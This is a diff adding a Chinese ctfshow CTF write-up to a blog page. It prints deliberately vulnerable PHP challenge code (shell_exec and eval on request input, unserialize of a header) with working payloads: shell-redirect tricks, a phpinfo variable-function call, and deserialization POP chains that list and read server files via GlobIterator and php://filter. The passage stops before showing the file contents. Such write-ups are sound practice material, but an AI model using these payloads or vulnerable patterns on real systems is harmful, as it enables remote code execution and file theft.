@@ -21,9 +21,9 @@
   </script>
 
   <meta property="og:type" content="website">
-<meta property="og:title" content="not coder">
+<meta property="og:title" content="blog">
 <meta property="og:url" content="http://example.com/page/4/index.html">
-<meta property="og:site_name" content="not coder">
+<meta property="og:site_name" content="blog">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="小zhou">
 <meta name="twitter:card" content="summary">
@@ -41,7 +41,7 @@
   };
 </script>
 
-  <title>not coder</title>
+  <title>blog</title>
   
 
 
@@ -92,7 +92,7 @@
 
     <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">not coder</h1>
+      <h1 class="site-title">blog</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
@@ -188,6 +188,692 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/" class="post-title-link" itemprop="url">ctfshow</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-22 17:35:14" itemprop="dateCreated datePublished" datetime="2023-05-22T17:35:14+08:00">2023-05-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-12 14:20:25" itemprop="dateModified" datetime="2023-10-12T14:20:25+08:00">2023-10-12</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+            <span id="more"></span>
+
+<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">     echo &quot;hack!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=&gt;nl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=*&gt;z</span><br></pre></td></tr></table></figure>
+
+<p> <code>*</code>代表 当前目录下文件，即nl xxx.php, </p>
+<p>然后访问z 即可</p>
+<h1 id="年ctf"><a href="#年ctf" class="headerlink" title="年ctf"></a>年ctf</h1><h2 id="除夕"><a href="#除夕" class="headerlink" title="除夕"></a>除夕</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line"></span><br><span class="line">if($year==2022 &amp;&amp; $year+1!==2023)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">year=2022.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="初三"><a href="#初三" class="headerlink" title="初三"></a>初三</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">extract($_GET);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=function($__,$___)&#123;</span><br><span class="line">    return $__==$___?$___:$__;</span><br><span class="line">&#125;;</span><br><span class="line">$$__($_($_GET&#123;</span><br><span class="line">    $___</span><br><span class="line">&#125;[$____]&#123;</span><br><span class="line">    $_____</span><br><span class="line">&#125;(),$flag));</span><br></pre></td></tr></table></figure>
+
+<p>$_GET 变量是一个数组，内容是由 HTTP GET 方法发送的变量名称和值。</p>
+<p>$_GET 变量用于收集来自 method&#x3D;”get” 的表单中的值。从带有 GET 方法的表单发送的信息，对任何人都是可见的（会显示在浏览器的地址栏），并且对发送的信息量也有限制（最多 100 个字符）。</p>
+<p>第一个函数内容</p>
+<p>参考yv师傅的blog</p>
+<p>传入两个参数若弱相等，则返回第二个参数，也就是flag</p>
+<p>再看下边，删掉换行变成如下，内容，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$__($_($_GET&#123;$___&#125;[$____]&#123;$_____&#125;(),$flag));</span><br></pre></td></tr></table></figure>
+
+<p>花括号换成中括号，成为三维数组，传入的第一个参数为函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET[$___][$____][$_____]</span><br></pre></td></tr></table></figure>
+
+<p>由于phpinfo()的返回值为ture</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?__=z&amp;z=var_dump&amp;x[b][c]=phpinfo&amp;___=x&amp;____=b&amp;_____=c</span><br></pre></td></tr></table></figure>
+
+<h2 id="初六"><a href="#初六" class="headerlink" title="初六"></a>初六</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//触发条件：调用不存在的方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>)); <span class="comment">//this-&gt;key可控，可以换成对象，触发invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>); <span class="comment">//触发creaesecret</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);<span class="comment">//变量拼接触发__tostring</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;  <span class="comment">//触发条件：调用不存在的属性，要么调用私有变量。</span></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>; <span class="comment">//同时触发触发__set</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;  <span class="comment">//触发条件：给不存在的成员属性赋值</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);   <span class="comment">//arg=get,argv=flag,   secret=getflag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="comment">//触发条件：把对象当成函数处理</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>; <span class="comment">//触发__get</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);  <span class="comment">//触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;你提交的key是&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n生成的secret是&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class happy2year&#123;</span><br><span class="line">        private $secret;</span><br><span class="line">        private $key;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">                $this-&gt;key=$this;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode(serialize(new happy2year()));</span><br></pre></td></tr></table></figure>
+
+<p>关于__set他魔术变量函数，我做了如下测试，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class zhou&#123;</span><br><span class="line">     public $secret;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $flag=&#x27;flag&#x27;;</span><br><span class="line">        $arg = &quot;get&quot;;</span><br><span class="line">        $this-&gt;arg = $flag; //同时触发触发__set</span><br><span class="line">    &#125;</span><br><span class="line">    function __set($arg, $argv)</span><br><span class="line">    &#123;  //触发条件：给不存在的成员属性赋值</span><br><span class="line">        $this-&gt;secret =$arg . $argv;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new zhou();</span><br><span class="line">echo ($a-&gt;secret);</span><br><span class="line">结果：argflag</span><br></pre></td></tr></table></figure>
+
+<h1 id="2023愚人杯"><a href="#2023愚人杯" class="headerlink" title="2023愚人杯"></a>2023愚人杯</h1><h2 id="被遗忘的反序列化"><a href="#被遗忘的反序列化" class="headerlink" title="被遗忘的反序列化"></a>被遗忘的反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">            <span class="comment">//这里需要利用PHP原生类GlobIterator来获取当前文件夹下的txt文件的名字，</span></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);<span class="comment">//用于读出check.php</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure>
+
+<p>首先他提示，当前目录下还有一个文件，尝试用原生类先读出当前目录文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;*txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span> = <span class="string">&#x27;GlobIterator&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$e</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload:如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:4:&quot;file&quot;;s:7:&quot;./*.txt&quot;;s:4:&quot;coos&quot;;s:12:&quot;GlobIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取hint</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span> = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EeE</span>();</span><br><span class="line"><span class="variable">$e</span> -&gt;text = <span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$e</span>);</span><br><span class="line"><span class="comment">//O:3:&quot;EeE&quot;:2:&#123;s:4:&quot;text&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=h1nt.txt&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:4:&quot;eeee&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>读出来的内容</p>
